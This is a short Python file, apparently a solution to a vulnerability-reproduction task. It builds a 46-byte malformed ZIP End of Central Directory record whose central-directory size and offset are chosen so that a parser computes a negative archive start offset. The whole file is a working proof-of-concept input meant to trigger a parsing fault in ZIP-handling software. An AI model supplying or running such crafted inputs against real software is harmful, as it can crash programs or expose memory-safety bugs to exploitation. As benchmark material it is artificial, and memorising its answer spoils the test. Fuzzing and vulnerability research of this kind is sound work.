import struct
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        # ZIP End of Central Directory (EOCD) with a 24-byte comment to make total length 46 bytes.
        # Fields are crafted so that computed archive start offset becomes negative.
        eocd = struct.pack(
            "<4sHHHHIIH",
            b"PK\x05\x06",  # EOCD signature
            0,              # number of this disk
            0,              # disk where central directory starts
            1,              # number of central directory records on this disk
            1,              # total number of central directory records
            46,             # size of central directory
            0,              # offset of start of central directory
            24              # ZIP file comment length
        )
        comment = b"\x00" * 24
        return eocd + comment